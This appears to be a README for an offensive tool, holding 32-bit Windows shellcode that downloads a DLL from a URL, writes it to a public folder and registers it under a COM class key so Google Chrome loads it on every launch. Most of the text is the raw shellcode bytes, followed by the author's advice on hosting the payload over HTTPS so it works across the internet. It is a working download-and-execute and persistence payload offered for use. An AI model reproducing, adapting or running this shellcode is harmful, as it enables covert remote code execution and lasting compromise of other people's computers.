# x86-com-hijack-shellcode
32 bit shellcode that performs COM hijacking with Chrome

## Usage: 
The shellcode will download a DLL from the URL "http://localhost/d.dll" and save it to "C:\Users\Public\d.dll". It then creates the registry key "HKCU\SOFTWARE\Classes\CLSID\{A4B544A1-438D-4B41-9325-869523E2D6C7}\InprocServer32", and sets the following values in it:
- (Default) = "C:\Users\Public\d.dll"
- ThreadingModel = "Apartment"

With these values set d.dll will be executed every time Google Chrome starts up, resulting in persistence on the system.

### Note:
The URLDownloadToFileA API is picky about the URLs supplied to it, and I could not get the API to work over HTTP with any sites I was accessing over WAN. However, HTTPS works just fine, so be sure to host the DLL on a URL over HTTPS if modifying the shellcode to download something over the internet.

### Raw shellcode:
\x89\xe5\x81\xc4\xf0\xf9\xff\xff\x31\xc9\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x5e\x08\x8b\x7e\x20\x8b\x36\x66\x39\x4f\x18\x75\xf2\xeb\x06\x5e\x89\x75\x04\xeb\x54\xe8\xf5\xff\xff\xff\x60\x8b\x43\x3c\x8b\x7c\x03\x78\x01\xdf\x8b\x4f\x18\x8b\x47\x20\x01\xd8\x89\x45\xfc\xe3\x36\x49\x8b\x45\xfc\x8b\x34\x88\x01\xde\x31\xc0\x99\xfc\xac\x84\xc0\x74\x07\xc1\xca\x0f\x01\xc2\xeb\xf4\x3b\x54\x24\x24\x75\xdf\x8b\x57\x24\x01\xda\x66\x8b\x0c\x4a\x8b\x57\x1c\x01\xda\x8b\x04\x8a\x01\xd8\x89\x44\x24\x1c\x61\xc3\x68\x33\x59\xe0\x8e\xff\x55\x04\x89\x45\x10\x68\x6c\x43\x3c\x58\xff\x55\x04\x89\x45\x14\x31\xc0\x66\xb8\x6c\x6c\x50\x68\x6f\x6e\x2e\x64\x68\x75\x72\x6c\x6d\x54\xff\x55\x14\x89\xc3\x68\x33\x9d\x5e\x72\xff\x55\x04\x89\x45\x18\x31\xc0\x50\x68\x2e\x64\x6c\x6c\x68\x70\x69\x33\x32\x68\x61\x64\x76\x61\x54\xff\x55\x14\x89\xc3\x68\xf4\x39\x35\xca\xff\x55\x04\x89\x45\x1c\x68\xf3\x30\xa0\x7e\xff\x55\x04\x89\x45\x20\x68\xd5\xd2\x53\xfd\xff\x55\x04\x89\x45\x24\x31\xc0\x66\xb8\x6c\x6c\x50\x68\x2f\x64\x2e\x64\x68\x68\x6f\x73\x74\x68\x6f\x63\x61\x6c\x68\x3a\x2f\x2f\x6c\x68\x68\x74\x74\x70\x54\x5f\x31\xc0\xb0\x6c\x50\x68\x64\x2e\x64\x6c\x68\x6c\x69\x63\x5c\x68\x5c\x50\x75\x62\x68\x73\x65\x72\x73\x68\x43\x3a\x5c\x55\x54\x5e\x31\xc0\x50\x50\x56\x57\x50\xff\x55\x18\x31\xc0\x50\x54\x5f\x50\x68\x65\x72\x33\x32\x68\x53\x65\x72\x76\x68\x70\x72\x6f\x63\x68\x7d\x5c\x49\x6e\x68\x44\x36\x43\x37\x68\x32\x33\x45\x32\x68\x38\x36\x39\x35\x68\x33\x32\x35\x2d\x68\x34\x31\x2d\x39\x68\x44\x2d\x34\x42\x68\x2d\x34\x33\x38\x68\x34\x34\x41\x31\x68\x41\x34\x42\x35\x68\x49\x44\x5c\x7b\x68\x5c\x43\x4c\x53\x68\x73\x73\x65\x73\x68\x5c\x43\x6c\x61\x68\x57\x41\x52\x45\x68\x53\x4f\x46\x54\x54\x59\x50\x57\x50\xbb\xff\x3f\x01\x0f\xc1\xeb\x08\x53\x50\x50\x50\x51\xb8\xff\xff\xff\x7f\xf7\xd8\x50\xff\x55\x1c\xb8\xeb\xff\xff\xff\xf7\xd8\x50\x56\x31\xc0\x40\x50\x48\x50\x50\x8b\x3f\x57\xff\x55\x20\xb8\x8c\xff\xff\xff\xf7\xd8\x50\x68\x74\x6d\x65\x6e\x68\x41\x70\x61\x72\x54\x5b\x66\xb8\x65\x6c\x50\x68\x67\x4d\x6f\x64\x68\x61\x64\x69\x6e\x68\x54\x68\x72\x65\x54\x59\xb8\xf6\xff\xff\xff\xf7\xd8\x50\x53\xb0\x01\x50\x48\x50\x51\x57\xff\x55\x20\x57\xff\x55\x24\x31\xc9\x51\x6a\xff\xff\x55\x10
